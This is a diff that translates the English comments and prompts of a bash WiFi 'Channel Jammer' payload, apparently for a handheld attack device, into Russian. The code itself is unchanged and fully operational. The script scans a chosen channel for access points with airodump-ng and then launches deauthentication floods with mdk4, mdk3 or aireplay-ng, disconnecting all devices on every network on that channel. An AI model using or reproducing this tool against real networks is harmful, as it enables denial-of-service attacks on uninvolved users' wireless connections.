@@ -1,70 +1,70 @@
 #!/bin/bash
-# Title: Channel Jammer
-# Author: bad-antics  
-# Description: Jam a specific WiFi channel with deauth floods
-# Category: nullsec/attack
+# Название: Подавитель канала
+# Автор: bad-antics  
+# Описание: Подавление определённого WiFi-канала флудом деаутентификации
+# Категория: nullsec/attack
 
-# Autodetect the right wireless interface (exports $IFACE).
-# Falls back to showing the pager error dialog if nothing is plugged in.
+# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
+# В случае отсутствия подходящего интерфейса показывает диалог с ошибкой.
 . /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
 nullsec_require_iface || exit 1
 
-PROMPT "CHANNEL JAMMER
+PROMPT "ПОДАВИТЕЛЬ КАНАЛА
 
-Disrupt all WiFi activity
-on a specific channel.
+Нарушение всей активности WiFi
+на определённом канале.
 
-Deauths ALL devices from
-ALL networks on target
-channel.
+Деаутентифицирует ВСЕ устройства
+из ВСЕХ сетей на целевом
+канале.
 
-Press OK to configure."
+Нажмите ОК для настройки."
 
-PROMPT "SELECT CHANNEL:
+PROMPT "ВЫБЕРИТЕ КАНАЛ:
 
-Common channels:
-1, 6, 11 (2.4GHz)
+Распространённые каналы:
+1, 6, 11 (2.4 ГГц)
 
-5GHz: 36, 40, 44, 48
-      149, 153, 157, 161
+5 ГГц: 36, 40, 44, 48
+       149, 153, 157, 161
 
-Enter channel next."
+Введите канал далее."
 
-CHANNEL=$(NUMBER_PICKER "Target Channel:" 6)
+CHANNEL=$(NUMBER_PICKER "Целевой канал:" 6)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac
 
-DURATION=$(NUMBER_PICKER "Duration (sec):" 60)
+DURATION=$(NUMBER_PICKER "Длительность (сек):" 60)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac
 
-resp=$(CONFIRMATION_DIALOG "START JAMMING?
+resp=$(CONFIRMATION_DIALOG "НАЧАТЬ ПОДАВЛЕНИЕ?
 
-Channel: $CHANNEL
-Длительность: ${DURATION}s
+Канал: $CHANNEL
+Длительность: ${DURATION} с
 
-⚠️ This will disconnect
-ALL users on channel $CHANNEL
+⚠️ Это отключит ВСЕХ
+пользователей на канале $CHANNEL
 
-Press OK to jam.")
+Нажмите ОК для подавления.")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
-LOG "Jamming channel $CHANNEL..."
+LOG "Подавление канала $CHANNEL..."
 
-# Lock to channel
+# Фиксация на канале
 iwconfig $IFACE channel $CHANNEL
 
-# Find all APs on channel
-SPINNER_START "Finding targets..."
+# Поиск всех ТД на канале
+SPINNER_START "Поиск целей..."
 timeout 5 airodump-ng $IFACE -c $CHANNEL --write-interval 1 -w /tmp/chanfind --output-format csv 2>/dev/null
 SPINNER_STOP
 
-# Extract BSSIDs
+# Извлечение BSSID
 grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/chanfind*.csv 2>/dev/null | sort -u > /tmp/jam_targets.txt
 
 TARGET_COUNT=$(wc -l < /tmp/jam_targets.txt 2>/dev/null || echo 0)
 
-LOG "Найдено $TARGET_COUNT APs"
+LOG "Найдено ТД: $TARGET_COUNT"
 
-# Start deauth flood on all targets
+# Запуск флуда деаутентификации на все цели
 if command -v mdk4 >/dev/null 2>&1; then
     mdk4 $IFACE d -c $CHANNEL &
     JAM_PID=$!
@@ -72,26 +72,26 @@ elif command -v mdk3 >/dev/null 2>&1; then
     mdk3 $IFACE d -c $CHANNEL &
     JAM_PID=$!
 else
-    # Fallback to aireplay
+    # Запасной вариант с aireplay
     while read BSSID; do
         aireplay-ng -0 0 -a "$BSSID" $IFACE 2>/dev/null &
     done < /tmp/jam_targets.txt
 fi
 
-PROMPT "JAMMING ACTIVE
+PROMPT "ПОДАВЛЕНИЕ АКТИВНО
 
-Channel: $CHANNEL
-Targets: $TARGET_COUNT APs
+Канал: $CHANNEL
+Целей: $TARGET_COUNT ТД
 
-Press OK to STOP."
+Нажмите ОК для ОСТАНОВКИ."
 
-# Stop all
+# Остановка всего
 killall mdk4 mdk3 aireplay-ng 2>/dev/null
 kill $JAM_PID 2>/dev/null
 
-PROMPT "JAMMING STOPPED
+PROMPT "ПОДАВЛЕНИЕ ОСТАНОВЛЕНО
 
-Channel: $CHANNEL
-Длительность: Active until stop
+Канал: $CHANNEL
+Длительность: Активно до остановки
 
-Press OK to exit."
+Нажмите ОК для выхода."
